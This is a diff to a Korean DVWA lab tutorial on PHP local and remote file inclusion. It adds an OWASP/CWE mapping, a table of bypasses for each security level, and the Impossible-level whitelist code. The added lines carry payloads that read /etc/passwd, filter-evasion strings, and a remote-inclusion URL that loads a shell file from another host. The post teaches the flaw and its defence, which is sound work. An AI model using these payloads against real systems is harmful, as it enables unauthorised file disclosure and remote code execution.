@@ -26,6 +26,21 @@ mermaid: true
 
 ---
 
+## OWASP Top 10 매핑
+
+| 항목 | 내용 |
+|---|---|
+| OWASP 카테고리 | **A03:2021 – Injection** (경로 조작 측면은 **A01 – Broken Access Control**) |
+| CWE | CWE-98 (PHP 원격 파일 포함) · CWE-22 (경로 조작, Path Traversal) |
+| 영향 | LFI: 시스템 파일 노출·로그 포이즈닝으로 RCE / RFI: 외부 악성 코드 실행(즉시 RCE) |
+| 한 줄 핵심 | 사용자 입력이 **`include()`의 파일 경로**로 쓰여, 임의 로컬/원격 파일이 코드로 실행됨 |
+
+> 코드를 포함·실행시키는 측면은 **A03 Injection(CWE-98)**, 디렉터리를 거슬러 올라가 파일을 읽는  
+> **Path Traversal(CWE-22)** 측면은 **A01 Broken Access Control**로도 분류된다. 두 관점을 함께 이해한다.
+{: .prompt-info }
+
+---
+
 ## 1. File Inclusion이란
 
 웹 애플리케이션이 외부 파일을 동적으로 불러올 때 발생하는 취약점이다.  
@@ -207,6 +222,19 @@ PHP 5.3.4 이전 버전에서 유효하다. Null 바이트 이후의 문자열�
 ---
 
 ## 5. DVWA 실습 — Security Level: Low
+
+### 5.0 레벨별 공격·방어 한눈에
+
+| 레벨 | 서버 측 방어 | 공격(우회) 방안 | 방어 한계 |
+|---|---|---|---|
+| **Low** | 없음 | `?page=../../../../etc/passwd`, `?page=http://192.168.0.10/shell.txt`(RFI) | 검증 자체가 없음 |
+| **Medium** | `http://`,`https://`,`../`,`..\` 문자열을 `str_replace`로 1회 제거 | 중첩 삽입 `hthttp://tp://`, `....//....//` (제거 후 원형 복원) | 1회 치환이라 중첩으로 복원됨 |
+| **High** | `fnmatch()`로 파일명이 **`file*`로 시작**해야 통과 | `file:///etc/passwd` 처럼 `file` 프로토콜 접두사로 화이트리스트 통과 | 접두사 패턴만 검사 |
+| **Impossible** | **허용 파일명 화이트리스트**(`include.php`,`file1.php`…)만 허용 | 목록 외 파일은 모두 거부 → 불가 | — (근본 방어) |
+
+> 핵심: 블랙리스트 치환(Medium)·접두사 검사(High)는 모두 우회된다.  
+> Impossible처럼 **허용 파일명을 고정 목록으로 화이트리스트**하는 것만이 안전하다(7장).
+{: .prompt-tip }
 
 ### 5.1 LFI 기본 테스트
 
@@ -404,6 +432,37 @@ http://192.168.0.30/DVWA/vulnerabilities/fi/?page=hthttp://tp://192.168.0.10/she
 ```
 http://192.168.0.30/DVWA/vulnerabilities/fi/?page=....//....//....//etc/passwd
 ```
+
+---
+
+## 6-1. Security Level: High 우회
+
+High 레벨은 `fnmatch("file*", $file)` 로 **파일명이 `file` 로 시작**해야만 통과시킨다.  
+`../` 나 `http://` 차단을 노린 것이지만, **`file://` 프로토콜 접두사**가 `file` 로 시작하므로 통과한다.
+
+```
+http://192.168.0.30/DVWA/vulnerabilities/fi/?page=file:///etc/passwd
+```
+
+> High의 교훈: "특정 접두사로 시작" 같은 **패턴 화이트리스트**는 의도치 않은 값(`file://`)을 허용할 수 있다.
+{: .prompt-warning }
+
+---
+
+## 6-2. Security Level: Impossible (방어 성공)
+
+Impossible 레벨은 **허용된 파일명만 명시적으로 화이트리스트**한다.
+
+```php
+// Impossible: 정해진 파일만 허용
+if ($file != "include.php" && $file != "file1.php" &&
+    $file != "file2.php" && $file != "file3.php") {
+    echo "ERROR: File not found!";
+    exit;
+}
+```
+
+`page` 값이 목록에 없으면 무조건 거부되므로, 경로 조작·프로토콜·중첩 우회가 모두 불가능하다.
 
 ---
 
